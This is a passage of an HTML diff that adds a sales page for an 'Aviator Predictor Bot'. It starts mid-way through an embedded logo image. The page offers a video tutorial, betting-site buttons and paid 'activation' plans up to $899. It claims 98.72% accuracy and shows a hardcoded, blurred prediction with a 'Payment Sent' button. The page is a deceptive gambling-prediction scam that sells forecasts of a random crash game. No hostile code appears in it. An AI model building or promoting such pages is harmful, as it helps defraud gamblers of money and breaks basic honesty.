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" alt="Odibets" style="height:32px;vertical-align:middle;"> Odibets</button>
+                    <button class="site-btn" data-site="HollywoodBets"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQqssActVFVlPDVR6NL1iZGNQn8wzDN1Kcsyg&s" alt="HollywoodBets" style="height:32px;vertical-align:middle;"> HollywoodBets</button>
+                    <button class="site-btn" data-site="SportPesa"><img src="data:image/jpeg;base64,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" alt="SportPesa" style="height:32px;vertical-align:middle;background-color:#e50914;width:32px;border-radius:4px;"> SportPesa</button>
+                    <button class="site-btn" data-site="ClassyBet"><img src="data:image/jpeg;base64,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" alt="ClassyBet" style="height:32px;vertical-align:middle;">ClassyBet</button>
+                </div>
+                <button class="bot-btn" id="connectBtn" style="margin-top:16px;">Connect</button>
+            </div>
+            
+            <h2><a href="https://avisignalspredictor.netlify.app">Click here to get a Free Trial </a>or <a href="https://avisignalspredictor.netlify.app">Activate Bot with Token</a></h2>
+            
+            <div style="margin-top:24px;text-align:center;">
+                <h2 style="color:#f1c40f;margin-bottom:16px;">Video Tutorial🎯</h2>
+                <video controls="" style="width:100%;max-width:600px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.3);">
+                    <source src="activatebot.mp4" type="video/mp4">
+                    Your browser does not support the video tag.
+                </video>
+                <p style="color:#ccc;margin-top:10px;font-size:0.9em;">👆 Watch this quick guide to see exactly how the bot works</p>
+            </div>
+    
+            <div class="hidden game-modal" id="gameModal">
+                <div class="game-container">
+                    <div class="game-content">
+                        <button class="close-game" onclick="closeGame()">&times;</button>
+                        <h1>avisignals.com</h1>
+                        <h2 style="color:#f1c40f;margin-bottom:20px;">Aviator Predictor Bot - Live</h2>
+                        <div class="plane-container">
+                            <div class="plane-icon"><img src="AvSiteImg/aviator_jogo.png" alt="Aviator Game"></div>
+                        </div>
+                        <div class="game-status" id="gameStatus">Spribe Bot - Environment</div>
+                        <div class="round-info">
+                            <div id="roundStatus" style="font-size:1.4em;margin-bottom:10px;">Waiting for next round...</div>
+                            <div class="prediction-display prediction-blurred" id="predictionDisplay">8.45x</div>
+                            <div id="roundTimer" style="color:#ccc;font-size:0.9em;"></div>
+                            <button class="game-start-btn" id="gameStartBtn" onclick="showActivationOptions()">Activate Bot</button>
+                        </div>
+                        
+                        
+                        <!-- Activation Overlay -->
+                        <div class="activation-overlay hidden" id="activationOverlay">
+                            <div class="activation-card">
+                                <h3 style="color:#f1c40f;margin-bottom:15px;">🔒 Activate Aviator Bot</h3>
+                                <p style="color:#ccc;margin-bottom:20px;">Choose your activation plan to unlock real-time predictions</p>
+                                
+                                <div class="pricing-grid">
+                                    <div class="price-option" data-plan="25min" data-price="28.99">
+                                        <div class="price-title">High Play</div>
+                                        <div class="price-amount">$28.99</div>
+                                        <div class="price-duration">30 Minutes</div>
+                                    </div>
+                                    <div class="price-option popular" data-plan="1hour" data-price="54.99">
+                                        <div class="price-title">Power Session</div>
+                                        <div class="price-amount">$54.99</div>
+                                        <div class="price-duration">1 Hour</div>
+                                    </div>
+                                </div>
+                                <div class="price-option" data-plan="3hours" data-price="78.99">
+                                    <div class="price-title">Extended Play</div>
+                                    <div class="price-amount">$78.99</div>
+                                    <div class="price-duration">3 Hours</div>
+                                </div>
+                                <div class="price-option" data-plan="6hours" data-price="99.9">
+                                    <div class="price-title">Premium Play</div>
+                                    <div class="price-amount">$99.9</div>
+                                    <div class="price-duration">6 Hours</div>
+                                </div>
+                                <div class="price-option" data-plan="24hour" data-price="479.99">
+                                    <div class="price-title">Pro Trader</div>
+                                    <div class="price-amount">$479</div>
+                                    <div class="price-duration">24 Hours(1Day)</div>
+                                </div>
+                                <div class="price-option" data-plan="72hour" data-price="899.99">
+                                    <div class="price-title">Master Trader</div>
+                                    <div class="price-amount">$899</div>
+                                    <div class="price-duration">72 Hours(3Days)</div>
+                                </div>
+                                 <button class="activate-btn" id="activateBtn" onclick="processPayment()" disabled>
+                                    Select a Plan to Activate
+                                </button>
+                                
+                                <div style="margin-top:15px;font-size:0.8em;color:#999;">
+                                    🔐 Secure payment • 💯 Instant activation • ⚡ Real-time predictions
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Footer moved inside game container for proper positioning -->
+                    <footer class="bot-footer">
+                        <span>Need help? Read the <a href="bot.html">guide</a> above. </span>
+                        <a href="main.html">Go to main site</a>
+                    </footer>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Payment Modal -->
+    <div id="paymentModal" class="modal hidden">
+        <div class="modal-content" style="max-width: 450px;">
+            <div class="payment-header">
+                <h3>🔐 Secure Payment</h3>
+                <span class="close-payment" onclick="closePaymentModal()">&times;</span>
+            </div>
+            <div class="payment-body">
+                <div class="payment-summary">
+                    <div class="plan-details">
+                        <div class="plan-name" id="paymentPlanName">15 Minutes Access</div>
+                        <div class="plan-price" id="paymentPlanPrice">$54.99</div>
+                    </div>
+                    <div class="payment-benefits">
+                        <div class="benefit">✅ Instant Bot Activation</div>
+                        <div class="benefit">✅ Real-time Predictions</div>
+                        <div class="benefit">✅ 98.72% Accuracy Rate</div>
+                        <div class="benefit">✅ Secure Payment Processing</div>
+                    </div>
+                </div>
+                
+                <form id="paymentForm" class="payment-form">
+                    <div class="payment-method">
+                        <label>Payment Method</label>
+                        <div class="payment-info">
+                            <div class="payment-notice">
+                                <i class="fas fa-info-circle"></i>
+                                <span>Secure checkout via Selar - supports Bank Transfer, Mobile Money and Credit/Debit Cards</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Complete Payment Button -->
+                    <button type="button" class="complete-payment-btn" id="completePaymentBtn" style="background: #ff6b35; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; width: 100%; margin: 20px 0 10px 0; transition: all 0.3s ease;">
+                        <i class="fas fa-external-link-alt"></i>
+                        Complete Payment
+                    </button>
+                    
+                    <!-- Activate Bot Button (Always Visible Below) -->
+                    <button type="button" class="activate-bot-btn" id="activateBotBtn" style="background: #28a745; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; width: 100%; margin-top: 10px;">
+                        <i class="fas fa-play"></i>
+                        Activate Bot (Payment Sent)
+                    </button>
